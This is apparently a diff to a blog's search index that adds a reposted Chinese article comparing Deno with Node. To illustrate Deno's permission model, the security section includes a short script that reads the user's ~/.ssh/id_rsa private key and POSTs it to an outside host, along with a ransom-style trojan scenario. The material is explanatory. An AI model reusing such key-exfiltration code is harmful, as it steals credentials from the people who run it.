@@ -1,6 +1,191 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Deno正式发布，彻底弄明白和Node的区别</title>
+    <url>/%E8%BD%AC%E8%BD%BD/Deno%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C%E5%BD%BB%E5%BA%95%E5%BC%84%E6%98%8E%E7%99%BD%E5%92%8CNode%E7%9A%84%E5%8C%BA%E5%88%AB.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Deno 已经正式发布了🎉！<a href="https://deno.land/" target="_blank" rel="noopener">官网地址</a></p>
+<p>我说这句话时候，是不是很多前端 和 NodeJS 工（码）程（农）师已经按不住自己的40米大刀了。心中的不仅感慨前端是真的会造轮子，有了 node 还不够吗，还没学会 node 又搞了个 deno，node 和 deno 啥区别？！</p>
+<p>的确，deno 和 node 形态很相似，要解决的问题似乎也相同，那他们到底有啥区别，这一切究竟是道德的沦丧还是 ry （作者）人性的扭曲，让我们走进本篇文章，一探究竟。</p>
+<h2 id="Deno-VS-Node"><a href="#Deno-VS-Node" class="headerlink" title="Deno VS Node"></a>Deno VS Node</h2><table>
+<thead>
+<tr>
+<th></th>
+<th>Node</th>
+<th>Deno</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>API 引用方式</td>
+<td>模块导入</td>
+<td>全局对象</td>
+</tr>
+<tr>
+<td>模块系统</td>
+<td>CommonJS &amp; 新版 node 实验性 ES Module</td>
+<td>ES Module 浏览器实现</td>
+</tr>
+<tr>
+<td>安全</td>
+<td>无安全限制</td>
+<td>默认安全</td>
+</tr>
+<tr>
+<td>Typescript</td>
+<td>第三方，如通过 ts-node 支持</td>
+<td>原生支持</td>
+</tr>
+<tr>
+<td>包管理</td>
+<td>npm + node_modules</td>
+<td>原生支持</td>
+</tr>
+<tr>
+<td>异步操作</td>
+<td>回调</td>
+<td>Promise</td>
+</tr>
+<tr>
+<td>包分发</td>
+<td>中心化 npmjs.com</td>
+<td>去中心化 import url</td>
+</tr>
+<tr>
+<td>入口</td>
+<td>package.json 配置</td>
+<td>import url 直接引入</td>
+</tr>
+<tr>
+<td>打包、测试、格式化</td>
+<td>第三方如 eslint、gulp、webpack、babel 等</td>
+<td>原生支持</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1-内置-API-引用方式不同"><a href="#1-内置-API-引用方式不同" class="headerlink" title="1.内置 API 引用方式不同"></a>1.内置 API 引用方式不同</h3><h4 id="node-模块导入"><a href="#node-模块导入" class="headerlink" title="node 模块导入"></a>node 模块导入</h4><p>node 内置 API 通过模块导入的方式引用，例如：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line">fs.readFileSync(<span class="string">"./data.txt"</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="deno-全局对象"><a href="#deno-全局对象" class="headerlink" title="deno 全局对象"></a>deno 全局对象</h4><p>而 deno 则是一个全局对象 <code>Deno</code> 的属性和方法：</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">Deno.readFileSync(<span class="string">"./data.txt"</span>);</span><br></pre></td></tr></table></figure>
+<p>具体 deno 有哪些方法，我们可以通过 <code>repl</code> 看一下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deno # 或 deno repl</span><br></pre></td></tr></table></figure>
+<p>进入 <code>repl</code> 后，输入 <code>Deno</code> 回车，我们可以看到：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> Buffer: [Function: Buffer],</span><br><span class="line"> readAll: [AsyncFunction: readAll],</span><br><span class="line"> readAllSync: [Function: readAllSync],</span><br><span class="line"> writeAll: [AsyncFunction: writeAll],</span><br><span class="line"> writeAllSync: [Function: writeAllSync],</span><br><span class="line"><span class="meta"> #</span> .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这种处理的方式好处是简单、方便，坏处是没有分类，想查找忘记的 API 比较困难。总体来说见仁见智。</p>
+<h3 id="2-模块系统"><a href="#2-模块系统" class="headerlink" title="2.模块系统"></a>2.模块系统</h3><p>我们再来看一下模块系统，这也是 deno 和 node 差别最大的地方，同样也是 deno 和 node 不兼容的地方。</p>
+<h4 id="node-CommonJS-规范"><a href="#node-CommonJS-规范" class="headerlink" title="node CommonJS 规范"></a>node CommonJS 规范</h4><p>我们都知道 node 采用的是 <a href="https://javascript.ruanyifeng.com/nodejs/module.html" target="_blank" rel="noopener">CommonJS</a> 规范，而 deno 则是采用的 ES Module 的浏览器实现，那么我们首先来认识一下：</p>
+<h4 id="ES-Module-的浏览器实现"><a href="#ES-Module-的浏览器实现" class="headerlink" title="ES Module 的浏览器实现"></a>ES Module 的浏览器实现</h4><p>而 deno 则采用 <strong>ES Module 的浏览器实现</strong>，具体关于 <a href="https://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">ES Module</a> 想必大家都早已熟知，但其浏览器实现可能大家还不是很熟悉，所以我们先看一下其浏览器实现：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 注意这里一定要加上 type="module" --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 从 URL 导入</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"https://unpkg.com/vue@2.6.11/dist/vue.esm.browser.js"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 从相对路径导入</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> * <span class="keyword">as</span> utils <span class="keyword">from</span> <span class="string">"./utils.js"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 从绝对路径导入</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> <span class="string">"/index.js"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 不支持</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> foo <span class="keyword">from</span> <span class="string">"foo.js"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> bar <span class="keyword">from</span> <span class="string">"bar/index.js"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> zoo <span class="keyword">from</span> <span class="string">"./index"</span>; <span class="comment">// 没有 .js 后缀</span></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="deno-的模块规范"><a href="#deno-的模块规范" class="headerlink" title="deno 的模块规范"></a>deno 的模块规范</h4><p>deno 完全遵循 es module 浏览器实现，deno 也是如此：</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 支持</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">"https://deno.land/std/fs/mod.ts"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; deepCopy &#125; <span class="keyword">from</span> <span class="string">"./deepCopy.js"</span>;</span><br><span class="line"><span class="keyword">import</span> foo <span class="keyword">from</span> <span class="string">"/foo.ts"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不支持</span></span><br><span class="line"><span class="keyword">import</span> foo <span class="keyword">from</span> <span class="string">"foo.ts"</span>;</span><br><span class="line"><span class="keyword">import</span> bar <span class="keyword">from</span> <span class="string">"./bar"</span>; <span class="comment">// 必须指定扩展名</span></span><br></pre></td></tr></table></figure>
+<p>我们发现其和我们平常在 webpack 或者 ts 使用 es module 最大的<strong>不同</strong>：</p>
+<ul>
+<li>可以通过 import url 直接引用线上资源；</li>
+<li>资源不可省略扩展名和文件名。</li>
+</ul>
+<p>关于第 1 点，争议非常大，有人很看好，觉得极大的扩展了 deno 库的范围；有人则不太看好，觉得国内网速的原因，并不实用。大家的看法如何，欢迎在评论区发表 🤔</p>
+<h3 id="3-安全"><a href="#3-安全" class="headerlink" title="3.安全"></a>3.安全</h3><p>如果模块规范是 node 和 deno 最大的不同，那么对安全的处理，则是另外一个让人摸不着头脑的地方。</p>
+<h4 id="模拟盗号"><a href="#模拟盗号" class="headerlink" title="模拟盗号"></a>模拟盗号</h4><p>在介绍之前我们先思考一下这个场景会不会出现：</p>
+<p>我做了一个基于命令行的一键上网工具 <code>breakwall</code>，每月 1 个 G 免费流量，然后将压缩后的 JS 代码发布到 npm 上，然后后在各种渠道宣传一波。</p>
+<p>羊毛党兴高彩烈的 <code>cnpm install -g breakwall</code>，然后每次使用的时候，我偷偷的将诸位的 ssh 密钥和各种能偷的文档及图片偷偷上传到我的服务器，在设定期限到期后，删除电脑上资料，留下一句拿钱换资料，仅支持比特币。</p>
+<h4 id="默认安全的-deno"><a href="#默认安全的-deno" class="headerlink" title="默认安全的 deno"></a>默认安全的 deno</h4><p>如果你觉得以上情况有可能出现，则会觉得下面的功能很实用。我们先用 deno 执行以下代码：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">let</span> rsa = Deno.readFileSync(Deno.dir(<span class="string">"home"</span>) + <span class="string">"/.ssh/id_rsa"</span>);</span><br><span class="line"></span><br><span class="line">rsa = <span class="keyword">new</span> TextDecoder().decode(rsa);</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">"http://jsonplaceholder.typicode.com/posts/1"</span>, &#123;</span><br><span class="line">  method: <span class="string">"POST"</span>,</span><br><span class="line">  body: <span class="built_in">JSON</span>.stringify(rsa)</span><br><span class="line">&#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>) =&gt;</span> res.json())</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">"密钥发送成功，嘿嘿嘿😜"</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"start breakwall..."</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>PS:<code>--unstable</code> 是由于<code>Deno.dir</code> API 不稳定</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --unstable index.js</span><br></pre></td></tr></table></figure>
+<p>我们将会得到如下报错信息：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --unstable  index.js</span><br><span class="line">error: Uncaught PermissionDenied: access to environment variables, run again with the --allow-env flag</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>意思就是权限异常，需要访问环境变量，需要加上 <code>--allow-env</code>，我们加上这个参数再试一下。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --unstable --allow-env index.js</span><br><span class="line">error: Uncaught PermissionDenied: read access to "/Users/Xiuming/.ssh/id_rsa", run again with the --allow-read flag</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>如此反复，还需加上 <code>--allow-read</code>、<code>--allow-net</code> ，最终的结果是：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --unstable --allow-env --allow-read --allow-net  index.js</span><br><span class="line">start breakwall...</span><br><span class="line">密钥发送成功，嘿嘿嘿😜</span><br></pre></td></tr></table></figure>
+<p>经过一番折腾，总算是发送成功了，要想盗取密钥实属不易。</p>
+<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>那有人就说了，如果我的应用确实需要访问网络和文件，但是有不想让它访问 .ssh 文件有没有办法？</p>
+<p>当然有了，我们可以给 <code>--allow-read</code> 和 <code>--allow-net</code> 指定白名单，名单之外都不可访问，例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --unstable --allow-env --allow-read --allow-net=https://www.baidu.com  index.js</span><br><span class="line">start breakwall...</span><br><span class="line">error: Uncaught PermissionDenied: network access to "http://jsonplaceholder.typicode.com/posts/1", run again with the --allow-net flag</span><br><span class="line">    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)</span><br><span class="line">    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)</span><br><span class="line">    at async fetch ($deno$/web/fetch.ts:591:27)</span><br></pre></td></tr></table></figure>
+<h4 id="简化参数"><a href="#简化参数" class="headerlink" title="简化参数"></a>简化参数</h4><p>如果确认是没问题，或者是自己开发软件时，图个方便，可以直接使用 <code>-A</code> 或 <code>--allow-all</code> 参数允许所有权限：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno -A --unstable index.js</span><br><span class="line">start breakwall...</span><br><span class="line">密钥发送成功，嘿嘿嘿😜</span><br></pre></td></tr></table></figure>
+<p>安全这方面见仁见智，有人觉得是多余，有人觉得很好用，极大的增强了安全性。如果你属于觉得这个功能多余的，可以 <code>deno run -A xxx</code> 即可。</p>
+<h3 id="4-兼容浏览器-API"><a href="#4-兼容浏览器-API" class="headerlink" title="4.兼容浏览器 API"></a>4.兼容浏览器 API</h3><p>很多人不理解，为什么你一个服务端语言要兼容浏览器 API，以及怎么兼容。</p>
+<h4 id="为什么要兼容浏览器-API"><a href="#为什么要兼容浏览器-API" class="headerlink" title="为什么要兼容浏览器 API"></a>为什么要兼容浏览器 API</h4><p>关于为什么，我举个栗子大家就明白了：在设计 node 之处，关于输出函数本来叫 <code>print</code> 之类的，后来有人提议为什么不叫 <code>console.log</code>，ry 觉得挺不错，于是就接纳了意见。</p>
+<p>但是，这个设计并不是刻意为之，而 deno 的设计则可以为之，通过与浏览器 API 保持一致，来<strong>减少大家的认知</strong>。</p>
+<h4 id="怎么兼容浏览器-API"><a href="#怎么兼容浏览器-API" class="headerlink" title="怎么兼容浏览器 API"></a>怎么兼容浏览器 API</h4><h5 id="概念上兼容"><a href="#概念上兼容" class="headerlink" title="概念上兼容"></a>概念上兼容</h5><ul>
+<li>模块系统，从上面介绍看出 deno 是完全遵循浏览器实现的；</li>
+<li>默认安全，当然也不是自己创造的概念，w3c 早已做出<a href="https://w3c.github.io/permissions/#permission-registry" target="_blank" rel="noopener">浏览器权限</a>的规定，我们在做小程序的时候尤为明显，需要获取各种权限；</li>
+<li>对于异步操作返回 Promise；</li>
+<li>使用 ArrayBuffer 处理二进制；</li>
+<li>等等…</li>
+</ul>
+<h5 id="存在-window-全局变量"><a href="#存在-window-全局变量" class="headerlink" title="存在 window 全局变量"></a>存在 window 全局变量</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span> === <span class="keyword">this</span>, <span class="built_in">window</span> === self, <span class="built_in">window</span> === globalThis);</span><br></pre></td></tr></table></figure>
+<h5 id="实现了-WindowOrWorkerGlobalScope-的全部方法"><a href="#实现了-WindowOrWorkerGlobalScope-的全部方法" class="headerlink" title="实现了 WindowOrWorkerGlobalScope 的全部方法"></a>实现了 <a href="[developer.mozilla.org/zh-CN/docs/…](https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope">WindowOrWorkerGlobalScope</a> 的全部方法</h5><p>具体方法列表，我们可以参考：<a href="https://github.com/denoland/deno/blob/master/cli/js/lib.deno.shared_globals.d.ts" target="_blank" rel="noopener">lib.deno.shared_globals.d.ts</a> 和 <a href="https://github.com/denoland/deno/blob/master/cli/js/lib.deno.window.d.ts" target="_blank" rel="noopener">lib.deno.window.d.ts</a></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求方法</span></span><br><span class="line">fetch(<span class="string">"https://baidu.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// base64 转化</span></span><br><span class="line"><span class="keyword">let</span> encodedData = btoa(<span class="string">"Hello, world"</span>); <span class="comment">// 编码</span></span><br><span class="line"><span class="keyword">let</span> decodedData = atob(encodedData); <span class="comment">// 解码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 微任务</span></span><br><span class="line">queueMicrotask(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">123</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等等...</span></span><br></pre></td></tr></table></figure>
+<h5 id="大趋势"><a href="#大趋势" class="headerlink" title="大趋势"></a>大趋势</h5><p>总体而言，如果服务端和浏览器端存在相同概念，deno 就不会创造新的概念。这一点其实 node 也在做，新的 <a href="https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V14.md" target="_blank" rel="noopener">node 14.0 CHANGELOG</a> 就也提及要实现 <code>Universal JavaScript</code> 和 <code>Spec compliance and Web Compatibility</code>的思想，所以这点大家应该都会接受吧，毕竟大势所趋趋势。</p>
+<h3 id="5-支持-typescript"><a href="#5-支持-typescript" class="headerlink" title="5.支持 typescript"></a>5.支持 typescript</h3><p>不管你喜欢与否，2020 年了，必须学习 TS 了（起码在面试的时候是亮点）。学完之后你才会明白<strong>真香定律</strong>真的无处不在。</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.ts</span></span><br><span class="line"><span class="keyword">let</span> str: <span class="built_in">string</span> = <span class="string">"真香定律"</span>;</span><br><span class="line">str = <span class="number">132</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run index.js</span><br><span class="line">error TS2322: Type '123' is not assignable to type 'string'.</span><br><span class="line"></span><br><span class="line">► file:///Users/Xiuming/Desktop/index.ts:2:1</span><br><span class="line"></span><br><span class="line">2 str = 123</span><br><span class="line">  ~~~</span><br></pre></td></tr></table></figure>
+<h3 id="6-去-node-modules"><a href="#6-去-node-modules" class="headerlink" title="6.去 node_modules"></a>6.去 node_modules</h3><p>deno 没有 node_modules，那么它是怎么进行包管理的呢？我们先看下面的例子</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; white, bgRed &#125; <span class="keyword">from</span> <span class="string">"https://deno.land/std/fmt/colors.ts"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bgRed(white(<span class="string">"hello world!"</span>)));</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run index.js</span><br><span class="line">Download https://deno.land/std/fmt/colors.ts</span><br><span class="line">Compile https://deno.land/std/fmt/colors.ts</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>
+<p>我们看到其有 <code>Download</code> 和 <code>Compile</code> 两个步骤，我们会产生几个疑问：</p>
+<p><strong>1、每次执行都要下载吗？</strong> 解：我们只需要<strong>再执行一次</strong>就能明白，不需要每次下载。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run index.js</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>
+<p><strong>2、Download 和 Compile 的文件在哪里呢？</strong> 解：我们会发现，当前执行的目录，并没有 Download 和 Compile 文件，那文件放在哪里呢，我们首先来看一下 <code>deno --help</code> 命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno --help</span><br><span class="line">SUBCOMMANDS:</span><br><span class="line"><span class="meta">#</span> ...</span><br><span class="line">info           Show info about cache or info related to source file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> ...</span><br><span class="line">ENVIRONMENT VARIABLES:</span><br><span class="line">    DENO_DIR   Set deno's base directory (defaults to $HOME/.deno)</span><br></pre></td></tr></table></figure>
+<p><code>deno info</code> 命令展示了依赖关系，类似 <code>package.json</code>。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno info index.js</span><br><span class="line">local: /Users/Xiuming/Desktop/index.js</span><br><span class="line">type: JavaScript</span><br><span class="line">deps:</span><br><span class="line">file:///Users/Xiuming/Desktop/index.js</span><br><span class="line">  └── https://deno.land/std/fmt/colors.ts</span><br></pre></td></tr></table></figure>
+<p><code>DENO_DIR</code> 则为实际的安装和编译目录，相当于 <code>node_modules</code>，默认为 <code>$HOME/.deno</code>（命令提示是这样的，但实际需要指定一下环境变量 <code>export DENO_DIR=$HOME/.deno</code>），我们看一下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> tree $HOME/.deno</span><br><span class="line">/Users/Xiuming/.deno</span><br><span class="line">├── deps</span><br><span class="line">│   └── https</span><br><span class="line">│       └── deno.land</span><br><span class="line">│           ├── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935</span><br><span class="line">│           └── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935.metadata.json</span><br><span class="line">└── gen</span><br><span class="line">    └── https</span><br><span class="line">        └── deno.land</span><br><span class="line">            └── std</span><br><span class="line">                └── fmt</span><br><span class="line">                    ├── colors.ts.js</span><br><span class="line">                    ├── colors.ts.js.map</span><br><span class="line">                    └── colors.ts.meta</span><br><span class="line"></span><br><span class="line">8 directories, 5 files</span><br></pre></td></tr></table></figure>
+<p><strong>3、没网络了怎么办？</strong></p>
+<p>我们有些场景是将本地写好的代码部署到没有网络的服务器，那么当执行 <code>deno run xxx</code> 时，就是提示 error sending request。</p>
+<p><code>解：</code>将上面的缓存目录内容，直接<strong>拷贝到服务器</strong>并指定环境变量到其目录即可。</p>
+<p><strong>4、依赖代码更新了怎么办？</strong></p>
+<p><code>解：</code>当依赖模块更新时，我们可以通过 <code>--reload</code> 进行更新缓存，例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --reload index.js</span><br></pre></td></tr></table></figure>
+<p>我们还可以通过<strong>白名单</strong>的方式，只更新部分依赖。例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> deno run --reload=https://deno.land index.js</span><br></pre></td></tr></table></figure>
+<p><strong>5、仅缓存依赖，不执行代码有办法吗？</strong></p>
+<p><code>解：</code>有的，我们可以通过 <code>deno cache index.js</code> 进行依赖缓存。</p>
+<h3 id="7-标准模块-与-node-API-兼容"><a href="#7-标准模块-与-node-API-兼容" class="headerlink" title="7.标准模块 与 node API 兼容"></a>7.标准模块 与 node API 兼容</h3><p>我们通过第 1 点可以看到，其实 deno 的 API 相对于 node 其实是少一些的，通过其文件大小也能看出来：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span> ll /usr/local/bin/node /Users/Xiuming/.local/bin/deno</span><br><span class="line">-rwxr-xr-x  1   42M   /Users/Xiuming/.local/bin/deno</span><br><span class="line">-rwxr-xr-x  1   70M   /usr/local/bin/node</span><br></pre></td></tr></table></figure>
+<p>那这些少的 API 只能自己写或者求助于社区吗？</p>
+<p>deno 对于自身相对于 node 少的和社区中常用的功能，提供了<a href="https://deno.land/std/" target="_blank" rel="noopener">标准模块</a>，其特点是不依赖非标准模块的内容，达到社区内的模块引用最后都收敛于标准模块的效果。例如：</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类似 node 中 chalk 包</span></span><br><span class="line"><span class="keyword">import</span> &#123; bgRed, white &#125; <span class="keyword">from</span> <span class="string">"https://deno.land/std/fmt/colors.ts"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似 node 中的 uuid 包</span></span><br><span class="line"><span class="keyword">import</span> &#123; v4 &#125; <span class="keyword">from</span> <span class="string">"https://deno.land/std/uuid/mod.ts"</span>;</span><br></pre></td></tr></table></figure>
+<p>同时为了对 node 用户友好，提供了 node API 的兼容</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> path <span class="keyword">from</span> <span class="string">"https://deno.land/std/node/path.ts"</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">"https://deno.land/std/node/fs.ts"</span>;</span><br></pre></td></tr></table></figure>
+<p>所以，大家在为 deno 社区做贡献的时候，首先要看一下标准模块有没有提供类似的功能，如果已经提供了可以进行引用。</p>
+<h3 id="8-异步操作"><a href="#8-异步操作" class="headerlink" title="8.异步操作"></a>8.异步操作</h3><blockquote>
+<p>根据 ry 自己是说法，在设计 node 是有人提议 Promise 处理回调，但是他没听，用他自己的话说就是愚蠢的拒绝了</p>
+</blockquote>
+<p>node 用回调的方式处理异步操作、deno 则选择用 Promise</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node 方式</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line">fs.readFile(<span class="string">"./data.txt"</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>另外 deno 支持 top-level-await，所以以上读取文件的代码可以为：</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// deno 方式</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> Deno.readFile(<span class="string">"./data.txt"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(data);</span><br></pre></td></tr></table></figure>
+<p>node 关于这方面也在一直改进，例如社区上很多 <code>promisify</code> 解决方案，通过包裹一层函数，实现目的。例如：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node API promisify</span></span><br><span class="line"><span class="keyword">const</span> &#123; promisify &#125; = <span class="built_in">require</span>(<span class="string">"es6-promisify"</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> readFile = promisify(fs.readFile);</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> readFile(<span class="string">"./data.txt"</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
+<h3 id="9-单文件分发"><a href="#9-单文件分发" class="headerlink" title="9.单文件分发"></a>9.单文件分发</h3><p>我们知道 npm 包必须有 <code>package.json</code> 文件，里面不仅需要指明 <code>main</code> 或 <code>module</code> 或 <code>browser</code> 等字段来标明入口文件，还需要指明 <code>name</code> 、<code>license</code> 、<code>description</code> 等字段来说明这个包。</p>
+<p>ry 觉得这些字段扰乱了开发者的视听，所以在 deno 中，其模块不需要任何配置文件，直接是 import url 的形式。</p>
+<h3 id="10-去中心化仓库"><a href="#10-去中心化仓库" class="headerlink" title="10.去中心化仓库"></a>10.去中心化仓库</h3><p>对于 <a href="http://www.npmjs.com" target="_blank" rel="noopener">www.npmjs.com</a> 我们肯定都不陌生，它是推动 node 蓬勃发展的重要支点。但作者认为它是中心化仓库，违背了互联网去中心化原则。</p>
+<p>所以 deno 并没有一个像 npmjs.com 的仓库，通过<code>import url</code>的方式将互联网任何一处的代码都可以引用。</p>
+<h3 id="11-去开发依赖"><a href="#11-去开发依赖" class="headerlink" title="11.去开发依赖"></a>11.去开发依赖</h3><p>我们在写一个 node 库或者工具时，开发依赖是少不了的，例如 babel 做转化和打包、jest 做测试、prettier 做代码格式化、eslint 做代码格式校检、gulp 或者 webpack 做构建等等，让我们在开发前就搞得筋疲力尽。</p>
+<p>deno 通过内置了一些工具，解决上述问题。</p>
+<ul>
+<li><code>deno bundle</code>：打包命令，用来替换 <code>babel</code>、<code>gulp</code> 一类工具: 例如：<code>deno bundle ./mod.ts</code>；</li>
+<li><code>deno fmt</code>：格式化命令，用来替换 <code>prettier</code> 一类工具，例如：<code>deno fmt ./mod.ts</code>；</li>
+<li><code>deno test</code>：运行测试代码，用来替换 <code>jest</code> 一类工具，例如 <code>deno test ./test.ts</code>；</li>
+<li><code>deno lint</code>：代码校检（暂未实现），用来替换 <code>eslint</code> 一类工具，例如：<code>deno lint ./mod.ts</code>。</li>
+</ul>
+<blockquote>
+<p>作者：dream2023<br>链接：<a href="https://juejin.im/post/5ebcad19f265da7bb07656c7" target="_blank" rel="noopener">https://juejin.im/post/5ebcad19f265da7bb07656c7</a><br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>转载</category>
+      </categories>
+      <tags>
+        <tag>转载</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>抓取Bilibili哔哩哔哩网站视频(Java和Python双版本实现)</title>
     <url>/Java/Python/%E6%8A%93%E5%8F%96Bilibili%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%E7%BD%91%E7%AB%99%E8%A7%86%E9%A2%91-Java%E5%92%8CPython%E5%8F%8C%E7%89%88%E6%9C%AC%E5%AE%9E%E7%8E%B0.html</url>
